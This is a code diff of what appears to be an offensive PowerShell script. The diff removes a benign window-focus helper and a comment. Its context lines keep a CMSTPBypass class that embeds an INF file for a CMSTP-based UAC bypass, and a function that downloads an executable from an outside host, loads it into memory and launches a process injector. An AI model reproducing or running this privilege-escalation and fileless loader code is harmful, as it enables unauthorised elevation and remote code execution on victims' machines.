@@ -87,8 +87,7 @@ using System.Runtime.InteropServices;
 
 public class CMSTPBypass
 {
-    // Our .INF file data!
-    public static string InfData = @"[version]
+public static string InfData = @"[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -110,7 +109,6 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
-
 ";
 
     [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -211,44 +209,7 @@ else {
     Execute
 }
 }
-function Set-WindowActive
-{
-  [CmdletBinding()]
 
-  Param
-  (
-    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
-  )
-  
-  Process
-  {
-    $memberDefinition = @'
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
-
-'@
-
-    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
-    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
-    If ($hwnd) 
-    {
-      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
-      [User32.Api]::SetForegroundWindow($hwnd)
-      [User32.Api]::ShowWindow($hwnd, 5)
-    }
-    Else 
-    {
-      [string] $hwnd = 'N/A'
-    }
-
-    $hash = @{
-      Process = $Name
-      Hwnd    = $hwnd
-    }
-        
-    New-Object -TypeName PsObject -Property $hash
-  }
-}
 function  Invoke-mg {
   $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://skt.mcsoft.org/Migrator7.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [PEx64_Injector.Program]::Main("")
 }
